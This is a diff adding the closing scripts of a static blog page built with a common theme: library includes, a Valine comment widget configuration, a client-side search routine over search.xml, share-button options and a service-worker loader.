+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: 'cM9V6UXqe4qtpXHOvQO5eS6R-gzGzoHsz',
+        appKey: 'lzYVPw46IOBJRFvDrn85wuxE',
+        placeholder: '欢迎大家 畅所欲言',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css">
+
+  
+  
+  <script src="/lib/needsharebutton/needsharebutton.js"></script>
+
+  <script>
+    
+      pbOptions = {};
+      
+          pbOptions.iconStyle = "default";
+      
+          pbOptions.boxForm = "horizontal";
+      
+          pbOptions.position = "bottomCenter";
+      
+          pbOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-postbottom', pbOptions);
+    
+    
+      flOptions = {};
+      
+          flOptions.iconStyle = "default";
+      
+          flOptions.boxForm = "vertical";
+      
+          flOptions.position = "topRight";
+      
+          flOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-float', flOptions);
+    
+  </script>
+
+  
+
+  
+
+  
+
+  
+
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+<script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
